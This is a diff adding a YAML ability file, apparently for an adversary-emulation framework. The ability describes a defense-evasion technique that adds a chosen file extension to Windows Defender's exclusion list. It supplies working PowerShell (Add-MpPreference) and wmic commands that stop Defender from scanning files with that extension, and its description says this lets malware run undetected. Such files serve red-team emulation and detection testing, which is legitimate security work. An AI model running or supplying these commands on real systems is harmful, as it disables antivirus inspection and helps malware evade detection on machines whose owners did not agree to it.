@@ -1,0 +1,23 @@
+id: 458e7ec1-6177-4bee-a89d-a6ffe9b1a043
+name: Add Windows Defender extension based exclusion
+description: |
+  Windows Defender allows Administrators to create exclusion lists that can be abused to make malware and Unwanted software run undetected.
+  This procedure Adds the given extension to this list, causing it not to be inspected by Windows Defender AV.
+  Extension must be provided in the following format: .extension
+metadata:
+  version: 1
+  authors:
+    - w0rk3r
+  tags: []
+tactic: defense-evasion
+technique:
+  id: T1089
+  name: "Disabling Security Tools"
+platforms:
+  windows:
+    psh:
+      command: |
+        Add-MpPreference -ExclusionExtension "#{file.extension}"
+    cmd:
+      command: |
+        wmic /Namespace:"\\root\Microsoft\Windows\Defender" class MSFT_MpPreference call Add ExclusionExtension="#{file.extension}"
